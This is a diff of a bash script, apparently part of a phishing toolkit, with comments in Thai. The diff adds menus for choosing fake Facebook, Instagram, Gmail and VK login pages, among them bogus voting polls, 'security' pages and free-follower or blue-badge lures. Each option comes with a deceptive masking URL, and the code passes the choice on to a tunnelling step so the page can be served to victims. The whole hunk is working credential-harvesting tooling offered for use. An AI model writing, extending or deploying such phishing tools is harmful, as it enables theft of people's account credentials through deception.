@@ -686,3 +686,146 @@ custom_url() {
         echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
         [[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
+
+
+## Facebook
+# ฟังก์ชันนี้ใช้สำหรับเลือกหน้าเว็บไซต์ปลอม (Phishing Page) สำหรับ Facebook
+# ผู้ใช้งานสามารถเลือกหน้าเว็บไซต์ที่ต้องการ เช่น หน้าล็อกอินแบบธรรมดา แบบโพลโหวต หรือหน้า Messenger
+# และทำการกำหนดค่าเว็บไซต์พร้อม URL หน้ากาก (Masked URL) ตามตัวเลือกที่เลือก
+
+site_facebook() {
+        cat <<- EOF
+
+                ${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page  # หน้าแบบล็อกอินธรรมดา
+                ${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page  # หน้าโพลโหวตแบบปลอม
+                ${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page  # หน้าล็อกอินแบบความปลอดภัยปลอม
+                ${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page  # หน้าล็อกอิน Messenger แบบปลอม
+
+        EOF
+
+        read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+        case $REPLY in 
+                1 | 01)  # ตัวเลือกที่ 1
+                        website="facebook"  # กำหนดค่าชื่อเว็บไซต์
+                        mask='https://blue-verified-badge-for-facebook-free'  # URL หน้ากาก
+                        tunnel_menu;;  # เรียกเมนู Tunnel
+                2 | 02)  # ตัวเลือกที่ 2
+                        website="fb_advanced"
+                        mask='https://vote-for-the-best-social-media'
+                        tunnel_menu;;
+                3 | 03)  # ตัวเลือกที่ 3
+                        website="fb_security"
+                        mask='https://make-your-facebook-secured-and-free-from-hackers'
+                        tunnel_menu;;
+                4 | 04)  # ตัวเลือกที่ 4
+                        website="fb_messenger"
+                        mask='https://get-messenger-premium-features-free'
+                        tunnel_menu;;
+                *)  # กรณีตัวเลือกไม่ถูกต้อง
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; clear; banner_small; site_facebook; };;  # แสดงเมนูอีกครั้ง
+        esac
+}
+
+## Instagram
+# ฟังก์ชันสำหรับเลือกหน้าเว็บไซต์ปลอมของ Instagram 
+# คล้ายกับ Facebook แต่จะมีตัวเลือกสำหรับผู้ติดตามอัตโนมัติและยืนยัน Blue Badge
+
+site_instagram() {
+        cat <<- EOF
+
+                ${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page  # หน้าแบบล็อกอินธรรมดา
+                ${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page  # หน้าเพิ่มผู้ติดตามอัตโนมัติ
+                ${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page  # หน้าเพิ่มผู้ติดตาม 1000 คน
+                ${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page  # หน้าสำหรับยืนยัน Blue Badge
+
+        EOF
+
+        read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+        case $REPLY in 
+                1 | 01)  # ตัวเลือกที่ 1
+                        website="instagram"
+                        mask='https://get-unlimited-followers-for-instagram'
+                        tunnel_menu;;  # เรียกเมนู Tunnel
+                2 | 02)  # ตัวเลือกที่ 2
+                        website="ig_followers"
+                        mask='https://get-unlimited-followers-for-instagram'
+                        tunnel_menu;;
+                3 | 03)  # ตัวเลือกที่ 3
+                        website="insta_followers"
+                        mask='https://get-1000-followers-for-instagram'
+                        tunnel_menu;;
+                4 | 04)  # ตัวเลือกที่ 4
+                        website="ig_verify"
+                        mask='https://blue-badge-verify-for-instagram-free'
+                        tunnel_menu;;
+                *)  # กรณีตัวเลือกไม่ถูกต้อง
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; clear; banner_small; site_instagram; };;  # แสดงเมนูอีกครั้ง
+        esac
+}
+
+## Gmail/Google
+# ฟังก์ชันสำหรับเลือกหน้าเว็บไซต์ปลอมของ Gmail หรือ Google
+# เช่น หน้าโพลโหวตหรือหน้า Login แบบเก่า/ใหม่
+
+site_gmail() {
+        cat <<- EOF
+
+                ${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page  # หน้า Gmail แบบเก่า
+                ${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page  # หน้า Gmail แบบใหม่
+                ${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll  # หน้าโพลโหวต
+
+        EOF
+
+        read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+        case $REPLY in 
+                1 | 01)  # ตัวเลือกที่ 1
+                        website="google"
+                        mask='https://get-unlimited-google-drive-free'
+                        tunnel_menu;;                
+                2 | 02)  # ตัวเลือกที่ 2
+                        website="google_new"
+                        mask='https://get-unlimited-google-drive-free'
+                        tunnel_menu;;
+                3 | 03)  # ตัวเลือกที่ 3
+                        website="google_poll"
+                        mask='https://vote-for-the-best-social-media'
+                        tunnel_menu;;
+                *)  # กรณีตัวเลือกไม่ถูกต้อง
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; clear; banner_small; site_gmail; };;  # แสดงเมนูอีกครั้ง
+        esac
+}
+
+## Vk
+# ฟังก์ชันสำหรับเลือกหน้าเว็บไซต์ปลอมของ Vk
+# มีตัวเลือกให้ผู้ใช้เลือกเป็นแบบล็อกอินธรรมดาหรือหน้าโพลโหวต
+
+site_vk() {
+        cat <<- EOF
+
+                ${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page  # หน้าแบบล็อกอินธรรมดา
+                ${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page  # หน้าโพลโหวตแบบปลอม
+
+        EOF
+
+        read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+        case $REPLY in 
+                1 | 01)  # ตัวเลือกที่ 1
+                        website="vk"
+                        mask='https://vk-premium-real-method-2020'
+                        tunnel_menu;;
+                2 | 02)  # ตัวเลือกที่ 2
+                        website="vk_poll"
+                        mask='https://vote-for-the-best-social-media'
+                        tunnel_menu;;
+                *)  # กรณีตัวเลือกไม่ถูกต้อง
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; clear; banner_small; site_vk; };;  # แสดงเมนูอีกครั้ง
+        esac
+}
